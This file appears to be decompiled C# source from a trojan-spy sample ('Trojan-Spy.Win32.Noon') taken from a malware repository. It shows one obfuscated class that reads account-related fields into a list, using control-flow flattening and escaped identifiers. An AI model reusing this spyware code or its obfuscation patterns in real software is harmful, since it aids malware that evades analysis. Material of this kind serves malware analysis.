// Decompiled with JetBrains decompiler
// Type:  
// Assembly: ProgIdRedirectionEn, Version=1.7.3.0, Culture=neutral, PublicKeyToken=null
// MVID: B81F1514-ABAD-442F-0D6D-30821B04B8DB
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\Trojan-Spy.Win32.Noon.bcqy-84d399a3116d4038d5730fdbae6857142c0141f042dbba9a42e8a21e1ce6448b.exe

using System;
using System.ComponentModel;
using System.Runtime.CompilerServices;

public sealed class \u0003\u2006 : \u000F\u2000
{
  private uint \u0002;
  private byte \u0003;
  private byte \u0005;
  private string \u0008;
  private string \u0006;
  private string \u000E;
  private int \u000F;
  private string \u0002\u2000;
  private uint \u0003\u2000;
  private BindingList<\u0008\u2003> \u0005\u2000;
  private bool \u0008\u2000;

  [MethodImpl(MethodImplOptions.NoInlining)]
  public \u0003\u2006(\u0002\u2002 _param1)
  {
    \u0003\u2004.\u0002();
    // ISSUE: explicit constructor call
    base.\u002Ector(_param1);
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  public \u0003\u2006(\u000F\u2001 _param1, int _param2)
  {
    \u0003\u2004.\u0002();
    // ISSUE: explicit constructor call
    base.\u002Ector(_param1, _param2);
  }

  [SpecialName]
  [MethodImpl(MethodImplOptions.NoInlining)]
  public uint LoginAccount() => this.\u0002;

  [SpecialName]
  [MethodImpl(MethodImplOptions.NoInlining)]
  public byte CountAccount() => this.\u0003;

  [SpecialName]
  [MethodImpl(MethodImplOptions.NoInlining)]
  public byte LogoutAccount() => this.\u0005;

  [SpecialName]
  [MethodImpl(MethodImplOptions.NoInlining)]
  public string PrepareAccount() => this.\u0008;

  [SpecialName]
  [MethodImpl(MethodImplOptions.NoInlining)]
  public string PrintAccount() => this.\u0006;

  [SpecialName]
  [MethodImpl(MethodImplOptions.NoInlining)]
  public string StopAccount() => this.\u000E;

  [SpecialName]
  [MethodImpl(MethodImplOptions.NoInlining)]
  public int ReadAccount() => this.\u000F;

  [SpecialName]
  [MethodImpl(MethodImplOptions.NoInlining)]
  public string CreateAccount() => this.\u0002\u2000;

  [SpecialName]
  [MethodImpl(MethodImplOptions.NoInlining)]
  public uint UpdateAccount() => this.\u0003\u2000;

  [SpecialName]
  [MethodImpl(MethodImplOptions.NoInlining)]
  public BindingList<\u0008\u2003> StartAccount()
  {
    if (this.\u0005\u2000 == null)
      this.\u0005\u2000 = new BindingList<\u0008\u2003>();
    return this.\u0005\u2000;
  }

  [SpecialName]
  [MethodImpl(MethodImplOptions.NoInlining)]
  public bool AddAccount() => this.\u0008\u2000;

  [SpecialName]
  [MethodImpl(MethodImplOptions.NoInlining)]
  public bool SetupAccount() => this.FindAccount() == (byte) 2;

  [MethodImpl(MethodImplOptions.NoInlining)]
  protected override void \u000F\u2000\u2007\u2001\u2003\u2008\u0002(\u000F\u2001 _param1)
  {
    int num1 = 5;
    while (true)
    {
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 1:
            goto label_3;
          case 2:
            goto label_2;
          case 3:
          case 4:
            goto label_1;
          case 5:
            this.\u0002 = _param1.\u0002();
            num2 = 0;
            continue;
          case 6:
            goto label_4;
          case 7:
            goto label_9;
          default:
            if (\u0003\u2006.\u0002())
            {
              num2 = 4;
              continue;
            }
            goto case 5;
        }
      }
label_1:
      this.\u0003\u2000 = _param1.\u0002();
      this.\u0002(_param1);
      num1 = 2;
      continue;
label_2:
      this.\u0008\u2000 = _param1.\u0002();
      num1 = 7;
      continue;
label_3:
      this.\u0003 = _param1.\u0002();
      this.\u0005 = _param1.\u0002();
      num1 = 6;
      continue;
label_4:
      this.\u0008 = _param1.\u0002();
      this.\u0006 = _param1.\u0002();
      this.\u000E = _param1.\u0002();
      this.\u000F = _param1.\u0002();
      this.\u0002\u2000 = _param1.\u0002();
      goto label_1;
    }
label_9:;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  private void \u0002(\u000F\u2001 _param1)
  {
    int num1 = 3;
    while (true)
    {
      int num2 = num1;
      uint length;
      int index1;
      string[] strArray1;
      int[] numArray;
      DateTime[] dateTimeArray;
      int index2;
      string[] strArray2;
      while (true)
      {
        bool flag;
        int index3;
        string[] strArray3;
        int index4;
        switch (num2)
        {
          case 0:
            if ((long) index3 >= (long) length)
            {
              index1 = 0;
              int num3 = 1;
              num2 = \u0003\u2006.\u0003() ? num3 : num3;
              continue;
            }
            strArray3[index3] = _param1.\u0002();
            ++index3;
            int num4 = 0;
            num2 = \u0003\u2006.\u0003() ? num4 : num4;
            continue;
          case 1:
            goto label_21;
          case 2:
            if (!flag)
            {
              num2 = 12;
              continue;
            }
            this.StartAccount().Add(new \u0008\u2003(strArray2[index4], strArray3[index4], strArray1[index4], numArray[index4], dateTimeArray[index4]));
            ++index4;
            break;
          case 3:
            length = _param1.\u0002();
            num2 = 10;
            continue;
          case 4:
            if ((long) index2 >= (long) length)
            {
              index3 = 0;
              goto case 0;
            }
            else
              goto label_9;
          case 5:
          case 8:
            index4 = 0;
            break;
          case 6:
          case 11:
            goto label_14;
          case 7:
            strArray3 = new string[(int) length];
            strArray1 = new string[(int) length];
            numArray = new int[(int) length];
            dateTimeArray = new DateTime[(int) length];
            index2 = 0;
            goto case 4;
          case 9:
            goto label_1;
          case 10:
            goto label_13;
          case 12:
            goto label_22;
          default:
            num2 = 11;
            continue;
        }
        flag = (long) index4 < (long) length;
        num2 = 2;
      }
label_1:
      bool flag1;
      if (!flag1)
      {
        num1 = 5;
        continue;
      }
      int index5;
      numArray[index5] = _param1.\u0002();
      dateTimeArray[index5] = _param1.\u0002();
      ++index5;
      goto label_16;
label_9:
      strArray2[index2] = _param1.\u0002();
      ++index2;
      num1 = 4;
      continue;
label_13:
      strArray2 = new string[(int) length];
      num1 = 7;
      continue;
label_14:
      index5 = 0;
label_16:
      flag1 = (long) index5 < (long) length;
      num1 = 9;
      continue;
label_21:
      for (; (long) index1 < (long) length; ++index1)
        strArray1[index1] = _param1.\u0002();
      goto label_14;
    }
label_22:;
  }

  internal new static bool \u0002() => true;

  internal new static bool \u0003() => false;
}
